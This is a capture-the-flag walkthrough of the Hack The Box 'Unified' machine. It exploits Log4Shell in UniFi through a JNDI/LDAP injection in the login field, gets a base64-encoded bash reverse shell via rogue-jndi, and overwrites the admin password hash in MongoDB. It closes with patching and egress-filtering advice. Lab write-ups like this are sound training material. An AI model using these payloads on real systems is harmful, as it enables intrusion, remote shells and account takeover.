# Unified

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 2) |
| **OS** | Linux |
| **Difficulty** | Very Easy (the hardest in the set: a multi-component exploit) |
| **Techniques** | Log4Shell (CVE-2021-44228), JNDI/LDAP injection, rogue-jndi, MongoDB, credential overwrite, SSH |

## Overview
UniFi Network Application 6.4.54 is vulnerable to Log4Shell. A JNDI lookup injected
into the login `remember` field makes the server fetch and run a malicious Java payload
(reverse shell as `unifi`). Then the local MongoDB is used to overwrite the admin
password hash, and the SSH root password is recovered from the UniFi device settings.

## Enumeration
```bash
nmap -p- --min-rate 1000 <TARGET_IP>
nmap -sC -sV -p 22,8443,6789,8080,8880 <TARGET_IP>
# browse https://<TARGET_IP>:8443 -> UniFi login, version 6.4.54 (Log4Shell range)
```
Confirm out-of-band before exploiting:
```bash
sudo tcpdump -i tun0 port 389          # watch for the callback
# inject into the login 'remember' field: ${jndi:ldap://<MY_IP>/test}  -> a hit on 389 proves it
```

## Exploitation (three moving parts)
```bash
# 1) rogue-jndi serves the malicious class (LDAP 1389 + HTTP 8000)
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
echo -n 'bash -i >& /dev/tcp/<MY_IP>/4444 0>&1' | base64
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}" --hostname "<MY_IP>"
# 2) listener
nc -lvnp 4444
# 3) trigger (target in the URL, me in the JNDI string)
curl -s -k -X POST https://<TARGET_IP>:8443/api/login -H "Content-Type: application/json" \
  -d '{"username":"a","password":"a","remember":"${jndi:ldap://<MY_IP>:1389/o=tomcat}","strict":true}'
```

## Privilege Escalation
```bash
# as unifi: the app's MongoDB is on localhost:27117
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson)"   # note administrator _id
mkpasswd -m sha-512 Password123                                      # make a known hash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<ID>")},{$set:{"x_shadow":"<HASH>"}})'
# log into the web UI as administrator / Password123, read the SSH root creds in Settings
ssh root@<TARGET_IP>
```

## Key Takeaway
Patch Log4j (or set `log4j2.formatMsgNoLookups=true` / remove the JndiLookup class) and
never log untrusted input with a vulnerable logger. Egress-filter so internal hosts
cannot make arbitrary outbound LDAP/HTTP, which kills the JNDI callback. Do not reuse the
UI/device password for root.

## What tripped me up
This box was a grind and the lessons are the gold:
- Two IPs, different jobs: the curl URL points at the TARGET; the `${jndi:...}` string
  and rogue-jndi `--hostname` point at ME. I wasted time hitting my own IP in the curl.
  The rule: everything points at you except the one request you fire, which points at
  the victim.
- Both 1389 (LDAP) and 8000 (HTTP class fetch) must be reachable; an LDAP hit with no
  shell means the class fetch or the base64 is the problem.
- "Address already in use" meant a stale rogue-jndi still held the port (`pkill -f
  RogueJndi`), and `/dev/tcp/IP/PORT` uses slashes, not a colon.
